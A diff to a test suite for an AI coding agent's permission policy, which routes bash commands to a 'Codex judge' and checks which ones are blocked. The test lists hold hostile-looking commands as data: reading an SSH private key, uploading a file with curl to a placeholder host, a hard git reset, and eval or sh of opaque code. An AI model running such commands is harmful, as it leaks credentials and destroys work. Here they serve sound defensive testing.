@@ -953,9 +953,9 @@ describe("permission policy Codex judge routing", () => {
     });
 
     const commands = [
-      'eval "$generated"',
+      "sudo echo ok",
       "cat <<'EOF'\nplain\nEOF",
-      'printf ok && sh -c "$generated"',
+      "make lint > ./lint.log",
     ];
     for (const [index, command] of commands.entries()) {
       expect(
@@ -976,7 +976,15 @@ describe("permission policy Codex judge routing", () => {
     const pi = createFakePi({ cwd, hasUI: false });
     setupPermissionPolicy(pi, makeConfig(judgeConfig(upstream)), {
       discoverProject: async () => verifiedProject(cwd),
-      executionBoundary,
+      executionBoundary: (toolName) => ({
+        ...executionBoundary(toolName),
+        ...(toolName === "bash"
+          ? {
+              writableWorktrees: [cwd],
+              worktreeCreateRoots: ["/private"],
+            }
+          : {}),
+      }),
     });
 
     const commands = [
@@ -984,6 +992,10 @@ describe("permission policy Codex judge routing", () => {
       "git reset --hard HEAD~1",
       "cat ~/.ssh/id_ed25519",
       "curl -T artifact https://api.example.test/upload",
+      'eval "$generated"',
+      "sh ./unknown-script.sh",
+      "bun x totally-unknown-package",
+      "make lint > /tmp/lint.log",
     ];
     for (const [index, command] of commands.entries()) {
       expect(
@@ -1474,13 +1486,9 @@ describe("permission policy Codex judge routing", () => {
     const controller = createTestAbortController();
     Object.assign(pi.ctx, { signal: controller.signal });
     pi.queueConfirm(false);
-    setupPermissionPolicy(
-      pi,
-      makeConfig({
-        ...judgeConfig(upstream),
-        confirmTimeoutMs: 1_234,
-      }),
-    );
+    const configured = judgeConfig(upstream);
+    configured.confirmTimeoutMs = 1_234;
+    setupPermissionPolicy(pi, makeConfig(configured));
 
     expect(await pi.emitToolCall(bashCall("git rev-parse HEAD"))).toEqual({
       block: true,
@@ -1662,7 +1670,7 @@ describe("permission policy Codex judge routing", () => {
       ),
     ).toEqual({
       block: true,
-      reason: expect.stringContaining("Codex判定器が無効"),
+      reason: expect.stringContaining("不透明な実行子"),
     });
     expect(upstream.received).toHaveLength(0);
   });
